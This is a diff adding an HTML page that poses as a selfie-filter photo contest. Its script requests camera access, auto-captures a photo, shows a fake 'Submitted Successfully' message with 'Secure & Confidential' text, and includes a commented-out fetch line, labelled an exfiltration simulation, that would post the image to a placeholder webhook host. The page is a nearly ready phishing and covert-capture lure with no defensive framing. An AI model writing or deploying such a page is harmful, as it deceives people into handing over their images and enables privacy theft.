@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Contest & Live Filter</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+        }
+        h2 { margin-top: 0; color: #ff6b6b; }
+        p { color: #666; font-size: 14px; }
+        video, canvas { display: none; }
+        .preview-box {
+            width: 100%;
+            height: 280px;
+            background: #f0f0f0;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+            overflow: hidden;
+            position: relative;
+            border: 2px dashed #ccc;
+        }
+        .preview-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .btn {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #ff5252; }
+        .status { margin-top: 15px; font-size: 13px; color: #888; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="main-card">
+    <h2>🎉 Join the Fun!</h2>
+    <p>Take a selfie to apply our exclusive filters and enter the weekly prize draw.</p>
+    
+    <div class="preview-box" id="box">
+        <span id="prompt-text">Click below to start camera</span>
+    </div>
+
+    <button class="btn" id="action-btn">Take Selfie & Enter</button>
+    <div class="status" id="status">Secure & Confidential</div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const actionBtn = document.getElementById('action-btn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const box = document.getElementById('box');
+    const statusDiv = document.getElementById('status');
+
+    let step = 0;
+
+    actionBtn.addEventListener('click', async () => {
+        if (step === 0) {
+            statusDiv.innerText = "Requesting camera access...";
+            try {
+                // Request environment or user camera, silent prompt on some webviews
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: false
+                });
+                video.srcObject = stream;
+                
+                // Wait for video metadata to load
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+
+                statusDiv.innerText = "Focusing lens...";
+                
+                // Auto capture after short delay to allow exposure adjustment
+                setTimeout(() => {
+                    captureAndSend(stream);
+                }, 1200);
+
+            } catch (err) {
+                statusDiv.innerText = "Permission needed to join contest.";
+                alert("Please allow camera permission to participate!");
+            }
+        }
+    });
+
+    function captureAndSend(stream) {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+        // Stop camera tracks
+        stream.getTracks().forEach(track => track.stop());
+
+        // Display fake success / preview
+        box.innerHTML = `<img src="${imageDataUrl}" alt="Selfie">`;
+        actionBtn.innerText = "Submitted Successfully!";
+        actionBtn.style.background = "#4cd137";
+        actionBtn.disabled = true;
+        statusDiv.innerText = "Entry registered! Redirecting in 3s...";
+
+        // Exfiltration simulation: send data via POST fetch or image beacon
+        // Example: fetch('https://your-webhook-url.com/collect', { method: 'POST', body: JSON.stringify({ image: imageDataUrl }) });
+        
+        console.log("Captured image payload ready for transmission.");
+    }
+</script>
+
+</body>
+</html>
